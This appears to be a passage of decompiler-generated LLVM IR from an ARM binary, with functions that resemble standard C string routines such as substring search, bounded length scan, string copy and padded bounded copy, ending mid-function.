define i32 @function_12060(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_12060:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_12064 = load i8, i8* %arg2, align 1
  %v2_12068 = icmp eq i8 %v3_12064, 0
  %v1_12158.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_12068, label %dec_label_pc_12154, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %dec_label_pc_12060
  %v1_12070 = add i32 %v1_12158.pre, -1
  store i32 %v1_12070, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12074

dec_label_pc_12074:                               ; preds = %dec_label_pc_12080, %dec_label_pc_12070
  %v0_12074 = phi i32 [ %v1_12074, %dec_label_pc_12080 ], [ %v1_12070, %dec_label_pc_12070 ]
  %v1_12074 = add i32 %v0_12074, 1
  %v2_12074 = inttoptr i32 %v1_12074 to i8*
  %v3_12074 = load i8, i8* %v2_12074, align 1
  store i32 %v1_12074, i32* %r0.global-to-local, align 4
  %v2_12078 = icmp eq i8 %v3_12074, 0
  br i1 %v2_12078, label %dec_label_pc_12150, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %dec_label_pc_12074
  %v9_12080 = icmp eq i8 %v3_12074, %v3_12064
  br i1 %v9_12080, label %dec_label_pc_12088, label %dec_label_pc_12074

dec_label_pc_12088:                               ; preds = %dec_label_pc_12080
  %v2_12088 = add i32 %tmp, 1
  %v3_12088 = inttoptr i32 %v2_12088 to i8*
  %v4_12088 = load i8, i8* %v3_12088, align 1
  %v2_1208c = icmp eq i8 %v4_12088, 0
  br i1 %v2_1208c, label %dec_label_pc_12154, label %dec_label_pc_12098

dec_label_pc_12098:                               ; preds = %dec_label_pc_12088
  %v1_12098 = add i32 %v0_12074, 2
  %v1_120ec = add i32 %tmp, 2
  %v2_120ec = inttoptr i32 %v1_120ec to i8*
  br label %dec_label_pc_120e4

dec_label_pc_120a8:                               ; preds = %dec_label_pc_12144
  %v3_120a8 = load i8, i8* %v3_120dc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120d4.preheader

dec_label_pc_120d4.preheader:                     ; preds = %dec_label_pc_120a8, %dec_label_pc_120e4
  %v0_120d43.in = phi i8 [ %v3_120a8, %dec_label_pc_120a8 ], [ %v3_120dc.pn, %dec_label_pc_120e4 ]
  %v9_120d412 = icmp eq i8 %v0_120d43.in, %v3_12064
  br i1 %v9_120d412, label %dec_label_pc_120dc, label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %dec_label_pc_120d4.preheader, %dec_label_pc_120d0
  %v0_120bc = phi i32 [ %v1_120d0, %dec_label_pc_120d0 ], [ %storemerge41, %dec_label_pc_120d4.preheader ]
  %v0_120b4.in = phi i8 [ %v3_120d0, %dec_label_pc_120d0 ], [ %v0_120d43.in, %dec_label_pc_120d4.preheader ]
  %v2_120b4 = icmp eq i8 %v0_120b4.in, 0
  br i1 %v2_120b4, label %dec_label_pc_12150, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_120b4
  %v1_120bc = add i32 %v0_120bc, 1
  %v2_120bc = inttoptr i32 %v1_120bc to i8*
  %v3_120bc = load i8, i8* %v2_120bc, align 1
  store i32 %v1_120bc, i32* %r0.global-to-local, align 4
  %v9_120c0 = icmp eq i8 %v3_120bc, %v3_12064
  br i1 %v9_120c0, label %dec_label_pc_120dc, label %dec_label_pc_120c8

dec_label_pc_120c8:                               ; preds = %dec_label_pc_120bc
  %v2_120c8 = icmp eq i8 %v3_120bc, 0
  br i1 %v2_120c8, label %dec_label_pc_12150, label %dec_label_pc_120d0

dec_label_pc_120d0:                               ; preds = %dec_label_pc_120c8
  %v1_120d0 = add i32 %v0_120bc, 2
  %v2_120d0 = inttoptr i32 %v1_120d0 to i8*
  %v3_120d0 = load i8, i8* %v2_120d0, align 1
  store i32 %v1_120d0, i32* %r0.global-to-local, align 4
  %v9_120d4 = icmp eq i8 %v3_120d0, %v3_12064
  br i1 %v9_120d4, label %dec_label_pc_120dc, label %dec_label_pc_120b4

dec_label_pc_120dc:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_120d0, %dec_label_pc_120d4.preheader
  %v0_120dc = phi i32 [ %storemerge41, %dec_label_pc_120d4.preheader ], [ %v1_120bc, %dec_label_pc_120bc ], [ %v1_120d0, %dec_label_pc_120d0 ]
  %v1_120dc = add i32 %v0_120dc, 1
  br label %dec_label_pc_120e4

dec_label_pc_120e4:                               ; preds = %dec_label_pc_12098, %dec_label_pc_120dc
  %storemerge41 = phi i32 [ %v1_120dc, %dec_label_pc_120dc ], [ %v1_12098, %dec_label_pc_12098 ]
  %v3_120dc.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_120dc.pn = load i8, i8* %v3_120dc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_120dc.pn, %v4_12088
  br i1 %storemerge, label %dec_label_pc_120e8, label %dec_label_pc_120d4.preheader

dec_label_pc_120e8:                               ; preds = %dec_label_pc_120e4
  %v1_120e8 = add i32 %storemerge41, 1
  %v2_120e8 = inttoptr i32 %v1_120e8 to i8*
  %v3_120e8 = load i8, i8* %v2_120e8, align 1
  %v4_120e8 = zext i8 %v3_120e8 to i32
  %v3_120ec = load i8, i8* %v2_120ec, align 1
  %v4_120ec = zext i8 %v3_120ec to i32
  %v9_120f4 = icmp eq i8 %v3_120e8, %v3_120ec
  %v1_120fc = add i32 %storemerge41, -1
  store i32 %v1_120fc, i32* %r0.global-to-local, align 4
  br i1 %v9_120f4, label %dec_label_pc_12104, label %dec_label_pc_12144

dec_label_pc_12104:                               ; preds = %dec_label_pc_120e8, %dec_label_pc_12134
  %v0_1211c = phi i32 [ %v1_12124, %dec_label_pc_12134 ], [ %v1_120ec, %dec_label_pc_120e8 ]
  %v0_12114 = phi i32 [ %v1_12120, %dec_label_pc_12134 ], [ %v1_120e8, %dec_label_pc_120e8 ]
  %v0_12104 = phi i32 [ %v4_12134, %dec_label_pc_12134 ], [ %v4_120e8, %dec_label_pc_120e8 ]
  %v2_12104 = icmp eq i32 %v0_12104, 0
  br i1 %v2_12104, label %dec_label_pc_12154, label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %dec_label_pc_12104
  %v1_1210c = add i32 %v0_12114, 1
  %v2_1210c = inttoptr i32 %v1_1210c to i8*
  %v3_1210c = load i8, i8* %v2_1210c, align 1
  %v1_12110 = add i32 %v0_1211c, 1
  %v2_12110 = inttoptr i32 %v1_12110 to i8*
  %v3_12110 = load i8, i8* %v2_12110, align 1
  %v4_12110 = zext i8 %v3_12110 to i32
  %v9_12118 = icmp eq i8 %v3_1210c, %v3_12110
  %v1_12120 = add i32 %v0_12114, 2
  %v1_12124 = add i32 %v0_1211c, 2
  br i1 %v9_12118, label %dec_label_pc_1212c, label %dec_label_pc_12144

dec_label_pc_1212c:                               ; preds = %dec_label_pc_1210c
  %v2_1212c = icmp eq i8 %v3_1210c, 0
  br i1 %v2_1212c, label %dec_label_pc_12154, label %dec_label_pc_12134

dec_label_pc_12134:                               ; preds = %dec_label_pc_1212c
  %v2_12134 = inttoptr i32 %v1_12124 to i8*
  %v3_12134 = load i8, i8* %v2_12134, align 1
  %v4_12134 = zext i8 %v3_12134 to i32
  %v2_12138 = inttoptr i32 %v1_12120 to i8*
  %v3_12138 = load i8, i8* %v2_12138, align 1
  %v9_1213c = icmp eq i8 %v3_12138, %v3_12134
  br i1 %v9_1213c, label %dec_label_pc_12104, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %dec_label_pc_12134, %dec_label_pc_1210c, %dec_label_pc_120e8
  %v0_12144 = phi i32 [ %v4_120ec, %dec_label_pc_120e8 ], [ %v4_12134, %dec_label_pc_12134 ], [ %v4_12110, %dec_label_pc_1210c ]
  %v2_12144 = icmp eq i32 %v0_12144, 0
  br i1 %v2_12144, label %dec_label_pc_12154, label %dec_label_pc_120a8

dec_label_pc_12150:                               ; preds = %dec_label_pc_12074, %dec_label_pc_120c8, %dec_label_pc_120b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %dec_label_pc_12144, %dec_label_pc_1212c, %dec_label_pc_12104, %dec_label_pc_12060, %dec_label_pc_12088, %dec_label_pc_12150
  %v1_12158 = phi i32 [ %v1_12074, %dec_label_pc_12088 ], [ 0, %dec_label_pc_12150 ], [ %v1_12158.pre, %dec_label_pc_12060 ], [ %v1_120fc, %dec_label_pc_12104 ], [ %v1_120fc, %dec_label_pc_1212c ], [ %v1_120fc, %dec_label_pc_12144 ]
  ret i32 %v1_12158

; uselistorder directives
  uselistorder i32 %v1_12120, { 1, 0 }
  uselistorder i8 %v3_120dc.pn, { 1, 0 }
  uselistorder i8* %v3_120dc.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_120d0, { 1, 0 }
  uselistorder i32 %v1_120d0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_12074, { 0, 2, 3, 1 }
  uselistorder i8 %v3_12064, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_12154, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_12150, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12104, { 1, 0 }
  uselistorder label %dec_label_pc_120e4, { 1, 0 }
  uselistorder label %dec_label_pc_120dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120b4, { 1, 0 }
  uselistorder label %dec_label_pc_120d4.preheader, { 1, 0 }
}

define i32 @function_1215c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1215c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1215c = icmp eq i32 %arg2, 0
  br i1 %v2_1215c, label %bb, label %dec_label_pc_12170

bb:                                               ; preds = %dec_label_pc_1215c
  br label %bb25

dec_label_pc_12170:                               ; preds = %dec_label_pc_1215c
  %v2_12170 = add i32 %tmp, %arg2
  %v3_12170 = icmp ult i32 %v2_12170, %tmp
  br i1 %v3_12170, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_12170
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12170, %bb19
  %v5_12210 = phi i32 [ %v2_12170, %dec_label_pc_12170 ], [ -1, %bb19 ]
  %v1_121904 = urem i32 %tmp, 4
  %v2_121905 = icmp eq i32 %v1_121904, 0
  br i1 %v2_121905, label %dec_label_pc_12198, label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %bb20, %dec_label_pc_1218c
  %v0_1218c = phi i32 [ %v1_1218c, %dec_label_pc_1218c ], [ %tmp, %bb20 ]
  %v1_12180 = inttoptr i32 %v0_1218c to i8*
  %v2_12180 = load i8, i8* %v1_12180, align 1
  %v2_12184 = icmp eq i8 %v2_12180, 0
  br i1 %v2_12184, label %dec_label_pc_1220c, label %dec_label_pc_1218c

dec_label_pc_1218c:                               ; preds = %dec_label_pc_12180
  %v1_1218c = add i32 %v0_1218c, 1
  %v1_12190 = urem i32 %v1_1218c, 4
  %v2_12190 = icmp eq i32 %v1_12190, 0
  br i1 %v2_12190, label %dec_label_pc_12198, label %dec_label_pc_12180

dec_label_pc_12198:                               ; preds = %dec_label_pc_1218c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_1218c, %dec_label_pc_1218c ]
  %v3_121fc30 = icmp ult i32 %storemerge.lcssa, %v5_12210
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_121fc30, label %dec_label_pc_121a0, label %dec_label_pc_1220c

dec_label_pc_121a0:                               ; preds = %dec_label_pc_121f8, %dec_label_pc_12198
  %v0_121f037 = phi i32 [ %v4_121a0, %dec_label_pc_121f8 ], [ %storemerge.lcssa, %dec_label_pc_12198 ]
  %v1_121a0 = inttoptr i32 %v0_121f037 to i32*
  %v2_121a0 = load i32, i32* %v1_121a0, align 4
  %v4_121a0 = add i32 %v0_121f037, 4
  %v2_121a4 = add i32 %v2_121a0, -16843009
  %v2_121a8 = and i32 %v2_121a4, -2139062144
  store i32 %v2_121a8, i32* @ip, align 4
  %v2_121ac = icmp eq i32 %v2_121a8, 0
  br i1 %v2_121ac, label %dec_label_pc_121f8, label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_121a0
  %v2_121b4 = inttoptr i32 %v0_121f037 to i8*
  %v3_121b4 = load i8, i8* %v2_121b4, align 1
  %v2_121b8 = icmp eq i8 %v3_121b4, 0
  br i1 %v2_121b8, label %bb21, label %dec_label_pc_121c8

bb21:                                             ; preds = %dec_label_pc_121b4
  br label %dec_label_pc_1220c

dec_label_pc_121c8:                               ; preds = %dec_label_pc_121b4
  %v1_121c8 = add i32 %v0_121f037, 1
  %v2_121c8 = inttoptr i32 %v1_121c8 to i8*
  %v3_121c8 = load i8, i8* %v2_121c8, align 1
  %v2_121cc = icmp eq i8 %v3_121c8, 0
  br i1 %v2_121cc, label %dec_label_pc_1220c, label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_121c8
  %v1_121d8 = add i32 %v0_121f037, 2
  %v2_121d8 = inttoptr i32 %v1_121d8 to i8*
  %v3_121d8 = load i8, i8* %v2_121d8, align 1
  %v2_121dc = icmp eq i8 %v3_121d8, 0
  br i1 %v2_121dc, label %dec_label_pc_1220c, label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %dec_label_pc_121d8
  %v1_121e8 = add i32 %v0_121f037, 3
  %v2_121e8 = inttoptr i32 %v1_121e8 to i8*
  %v3_121e8 = load i8, i8* %v2_121e8, align 1
  %v2_121ec = icmp eq i8 %v3_121e8, 0
  br i1 %v2_121ec, label %dec_label_pc_1220c, label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121e8, %dec_label_pc_121a0
  %v3_121fc = icmp ult i32 %v4_121a0, %v5_12210
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_121fc, label %dec_label_pc_121a0, label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121f8, %dec_label_pc_12198, %dec_label_pc_12180, %dec_label_pc_121c8, %dec_label_pc_121d8, %dec_label_pc_121e8, %bb21
  %v1_1220c = phi i32 [ %v0_121f037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_12198 ], [ %v1_121c8, %dec_label_pc_121c8 ], [ %v1_121d8, %dec_label_pc_121d8 ], [ %v1_121e8, %dec_label_pc_121e8 ], [ %v5_12210, %dec_label_pc_121f8 ], [ %v0_1218c, %dec_label_pc_12180 ]
  %v3_1220c = icmp uge i32 %v5_12210, %v1_1220c
  %v9_1220c = icmp eq i32 %v5_12210, %v1_1220c
  %v2_12210 = xor i1 %v3_1220c, true
  %v3_12210 = or i1 %v9_1220c, %v2_12210
  br i1 %v3_12210, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1220c
  %v6_12210 = sub i32 %v5_12210, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1220c, %bb22
  %v5_12214 = phi i32 [ %v1_1220c, %dec_label_pc_1220c ], [ %v6_12210, %bb22 ]
  %v2_12214 = xor i1 %v9_1220c, true
  %v3_12214 = and i1 %v3_1220c, %v2_12214
  br i1 %v3_12214, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_12214 = sub i32 %v5_12214, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_1221c = phi i32 [ 0, %bb ], [ %v5_12214, %bb23 ], [ %v6_12214, %bb24 ]
  ret i32 %v1_1221c

; uselistorder directives
  uselistorder i1 %v3_1220c, { 1, 0 }
  uselistorder i32 %v4_121a0, { 1, 0 }
  uselistorder i32 %v0_121f037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1218c, { 1, 0, 2 }
  uselistorder i32 %v5_12210, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_1220c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_12180, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_12228(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12228:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_122381 = load i32, i32* @r1, align 4
  %v1_122382 = inttoptr i32 %v0_122381 to i8*
  %v2_122383 = load i8, i8* %v1_122382, align 1
  %v2_1223c5 = icmp eq i8 %v2_122383, 0
  store i1 %v2_1223c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_122383, i8* %arg1, align 1
  br i1 %v2_1223c5, label %dec_label_pc_12248, label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_12228, %dec_label_pc_12230
  %v0_12230 = load i32, i32* @r1, align 4
  %v1_12230 = add i32 %v0_12230, 1
  store i32 %v1_12230, i32* @r1, align 4
  %v0_12234 = load i32, i32* %r2.global-to-local, align 4
  %v1_12234 = add i32 %v0_12234, 1
  store i32 %v1_12234, i32* %r2.global-to-local, align 4
  %v1_12238 = inttoptr i32 %v1_12230 to i8*
  %v2_12238 = load i8, i8* %v1_12238, align 1
  %v2_1223c = icmp eq i8 %v2_12238, 0
  store i1 %v2_1223c, i1* %cpsr_z.global-to-local, align 1
  %v3_12240 = inttoptr i32 %v1_12234 to i8*
  store i8 %v2_12238, i8* %v3_12240, align 1
  %v0_12244 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12244, label %dec_label_pc_12248, label %dec_label_pc_12230

dec_label_pc_12248:                               ; preds = %dec_label_pc_12230, %dec_label_pc_12228
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12230, { 1, 0 }
}

define i32 @function_1224c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1224c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_1224c = icmp eq i32 %arg2, 3
  store i1 %v7_1224c, i1* %cpsr_z.global-to-local, align 1
  %v0_12250 = load i32, i32* @lr, align 4
  store i32 %v0_12250, i32* %stack_var_-4, align 4
  %v1_12254 = add i32 %arg1, -1
  store i32 %v1_12254, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_122d0, label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1224c
  %v3_1225c = udiv i32 %arg2, 4
  store i32 %v3_1225c, i32* %lr.global-to-local, align 4
  %v0_12260.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12260

dec_label_pc_12260:                               ; preds = %dec_label_pc_122ac, %dec_label_pc_1225c
  %v2_12268 = phi i32 [ %v6_122a0, %dec_label_pc_122ac ], [ %v1_12254, %dec_label_pc_1225c ]
  %v0_12260 = phi i32 [ %v1_122b0, %dec_label_pc_122ac ], [ %v0_12260.pre, %dec_label_pc_1225c ]
  %v1_12260 = inttoptr i32 %v0_12260 to i8*
  %v2_12260 = load i8, i8* %v1_12260, align 1
  %v3_12260 = zext i8 %v2_12260 to i32
  store i32 %v3_12260, i32* %r3.global-to-local, align 4
  %v2_12264 = icmp eq i8 %v2_12260, 0
  store i1 %v2_12264, i1* %cpsr_z.global-to-local, align 1
  %v3_12268 = add i32 %v2_12268, 1
  %v4_12268 = inttoptr i32 %v3_12268 to i8*
  store i8 %v2_12260, i8* %v4_12268, align 1
  %v5_12268 = load i32, i32* %ip.global-to-local, align 4
  %v6_12268 = add i32 %v5_12268, 1
  store i32 %v6_12268, i32* %ip.global-to-local, align 4
  %v0_1226c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1226c, label %dec_label_pc_122bc, label %dec_label_pc_12270

dec_label_pc_12270:                               ; preds = %dec_label_pc_12260
  %v0_12270 = load i32, i32* @r1, align 4
  %v1_12270 = add i32 %v0_12270, 1
  %v2_12270 = inttoptr i32 %v1_12270 to i8*
  %v3_12270 = load i8, i8* %v2_12270, align 1
  %v4_12270 = zext i8 %v3_12270 to i32
  store i32 %v4_12270, i32* %r3.global-to-local, align 4
  %v2_12274 = icmp eq i8 %v3_12270, 0
  store i1 %v2_12274, i1* %cpsr_z.global-to-local, align 1
  %v3_12278 = add i32 %v5_12268, 2
  %v4_12278 = inttoptr i32 %v3_12278 to i8*
  store i8 %v3_12270, i8* %v4_12278, align 1
  %v5_12278 = load i32, i32* %ip.global-to-local, align 4
  %v6_12278 = add i32 %v5_12278, 1
  store i32 %v6_12278, i32* %ip.global-to-local, align 4
  %v0_1227c = load i32, i32* @r1, align 4
  %v1_1227c = add i32 %v0_1227c, 1
  store i32 %v1_1227c, i32* %r1.global-to-local, align 4
  %v0_12280 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12280, label %dec_label_pc_122bc, label %dec_label_pc_12284

dec_label_pc_12284:                               ; preds = %dec_label_pc_12270
  %v1_12284 = add i32 %v0_1227c, 2
  %v2_12284 = inttoptr i32 %v1_12284 to i8*
  %v3_12284 = load i8, i8* %v2_12284, align 1
  %v4_12284 = zext i8 %v3_12284 to i32
  store i32 %v4_12284, i32* %r3.global-to-local, align 4
  %v2_12288 = icmp eq i8 %v3_12284, 0
  store i1 %v2_12288, i1* %cpsr_z.global-to-local, align 1
  %v3_1228c = add i32 %v5_12278, 2
  %v4_1228c = inttoptr i32 %v3_1228c to i8*
  store i8 %v3_12284, i8* %v4_1228c, align 1
  %v5_1228c = load i32, i32* %ip.global-to-local, align 4
  %v6_1228c = add i32 %v5_1228c, 1
  store i32 %v6_1228c, i32* %ip.global-to-local, align 4
  %v0_12290 = load i32, i32* %r1.global-to-local, align 4
  %v1_12290 = add i32 %v0_12290, 1
  store i32 %v1_12290, i32* %r1.global-to-local, align 4
  %v0_12294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12294, label %dec_label_pc_122bc, label %dec_label_pc_12298

dec_label_pc_12298:                               ; preds = %dec_label_pc_12284
  %v1_12298 = add i32 %v0_12290, 2
  %v2_12298 = inttoptr i32 %v1_12298 to i8*
  %v3_12298 = load i8, i8* %v2_12298, align 1
  %v4_12298 = zext i8 %v3_12298 to i32
  store i32 %v4_12298, i32* %r3.global-to-local, align 4
  %v2_1229c = icmp eq i8 %v3_12298, 0
  store i1 %v2_1229c, i1* %cpsr_z.global-to-local, align 1
  %v3_122a0 = add i32 %v5_1228c, 2
  %v4_122a0 = inttoptr i32 %v3_122a0 to i8*
  store i8 %v3_12298, i8* %v4_122a0, align 1
  %v5_122a0 = load i32, i32* %ip.global-to-local, align 4
  %v6_122a0 = add i32 %v5_122a0, 1
  store i32 %v6_122a0, i32* %ip.global-to-local, align 4
  %v0_122a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_122a4 = add i32 %v0_122a4, 1
  store i32 %v1_122a4, i32* %r1.global-to-local, align 4
  %v0_122a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_122a8, label %dec_label_pc_122bc, label %dec_label_pc_122ac

dec_label_pc_122ac:                               ; preds = %dec_label_pc_12298
  %v0_122ac = load i32, i32* %lr.global-to-local, align 4
  %v1_122ac = add i32 %v0_122ac, -1
  store i32 %v1_122ac, i32* %lr.global-to-local, align 4
  %v7_122ac = icmp eq i32 %v0_122ac, 1
  store i1 %v7_122ac, i1* %cpsr_z.global-to-local, align 1
  %v1_122b0 = add i32 %v0_122a4, 2
  store i32 %v1_122b0, i32* @r1, align 4
  br i1 %v7_122ac, label %dec_label_pc_122d0, label %dec_label_pc_12260

dec_label_pc_122bc:                               ; preds = %dec_label_pc_12298, %dec_label_pc_12284, %dec_label_pc_12270, %dec_label_pc_12260
  %v1_122bc = phi i32 [ %v6_122a0, %dec_label_pc_12298 ], [ %v6_1228c, %dec_label_pc_12284 ], [ %v6_12278, %dec_label_pc_12270 ], [ %v6_12268, %dec_label_pc_12260 ]
  %v2_122bc1 = sub i32 %arg1, %v1_122bc
  %v2_122c0 = add i32 %v2_122bc1, %arg2
  %v1_122c4 = add i32 %v2_122c0, -1
  store i32 %v1_122c4, i32* %r3.global-to-local, align 4
  %v7_122c4 = icmp eq i32 %v2_122c0, 1
  store i1 %v7_122c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_122c4, label %dec_label_pc_12300, label %dec_label_pc_122f0

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122ac, %dec_label_pc_1224c
  %v2_122e07 = phi i32 [ %v1_12254, %dec_label_pc_1224c ], [ %v6_122a0, %dec_label_pc_122ac ]
  %v1_122d0 = urem i32 %arg2, 4
  store i32 %v1_122d0, i32* %r3.global-to-local, align 4
  %v2_122d0 = icmp eq i32 %v1_122d0, 0
  store i1 %v2_122d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122d0, label %dec_label_pc_12300, label %dec_label_pc_122d8

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122d0, %dec_label_pc_122e8.dec_label_pc_122d8_crit_edge
  %v2_122e0 = phi i32 [ %v6_122e0, %dec_label_pc_122e8.dec_label_pc_122d8_crit_edge ], [ %v2_122e07, %dec_label_pc_122d0 ]
  %v0_122dc = phi i32 [ %v0_122dc.pre, %dec_label_pc_122e8.dec_label_pc_122d8_crit_edge ], [ %v1_122d0, %dec_label_pc_122d0 ]
  %v0_122d8 = load i32, i32* @r1, align 4
  %v1_122d8 = inttoptr i32 %v0_122d8 to i8*
  %v2_122d8 = load i8, i8* %v1_122d8, align 1
  %v3_122d8 = zext i8 %v2_122d8 to i32
  store i32 %v3_122d8, i32* %r2.global-to-local, align 4
  %v5_122d8 = add i32 %v0_122d8, 1
  store i32 %v5_122d8, i32* @r1, align 4
  %v1_122dc = add i32 %v0_122dc, -1
  store i32 %v1_122dc, i32* %r3.global-to-local, align 4
  %v7_122dc = icmp eq i32 %v0_122dc, 1
  store i1 %v7_122dc, i1* %cpsr_z.global-to-local, align 1
  %v3_122e0 = add i32 %v2_122e0, 1
  %v4_122e0 = inttoptr i32 %v3_122e0 to i8*
  store i8 %v2_122d8, i8* %v4_122e0, align 1
  %v5_122e0 = load i32, i32* %ip.global-to-local, align 4
  %v6_122e0 = add i32 %v5_122e0, 1
  store i32 %v6_122e0, i32* %ip.global-to-local, align 4
  %v0_122e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_122e4, label %dec_label_pc_12300, label %dec_label_pc_122e8

dec_label_pc_122e8:                               ; preds = %dec_label_pc_122d8
  %v0_122e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_122e8 = icmp eq i32 %v0_122e8, 0
  store i1 %v2_122e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122e8, label %dec_label_pc_122f0, label %dec_label_pc_122e8.dec_label_pc_122d8_crit_edge

dec_label_pc_122e8.dec_label_pc_122d8_crit_edge:  ; preds = %dec_label_pc_122e8
  %v0_122dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_122d8

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122e8, %dec_label_pc_122bc
  %v2_122f810 = phi i32 [ %v1_122bc, %dec_label_pc_122bc ], [ %v6_122e0, %dec_label_pc_122e8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %dec_label_pc_122f4.dec_label_pc_122f4_crit_edge, %dec_label_pc_122f0
  %v2_122f8 = phi i32 [ %v6_122f8, %dec_label_pc_122f4.dec_label_pc_122f4_crit_edge ], [ %v2_122f810, %dec_label_pc_122f0 ]
  %v0_122f8.off0 = phi i8 [ %extract.t, %dec_label_pc_122f4.dec_label_pc_122f4_crit_edge ], [ 0, %dec_label_pc_122f0 ]
  %v0_122f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_122f4 = add i32 %v0_122f4, -1
  store i32 %v1_122f4, i32* %r3.global-to-local, align 4
  %v7_122f4 = icmp eq i32 %v0_122f4, 1
  store i1 %v7_122f4, i1* %cpsr_z.global-to-local, align 1
  %v3_122f8 = add i32 %v2_122f8, 1
  %v4_122f8 = inttoptr i32 %v3_122f8 to i8*
  store i8 %v0_122f8.off0, i8* %v4_122f8, align 1
  %v5_122f8 = load i32, i32* %ip.global-to-local, align 4
  %v6_122f8 = add i32 %v5_122f8, 1
  store i32 %v6_122f8, i32* %ip.global-to-local, align 4
  %v0_122fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_122fc, label %dec_label_pc_12300, label %dec_label_pc_122f4.dec_label_pc_122f4_crit_edge

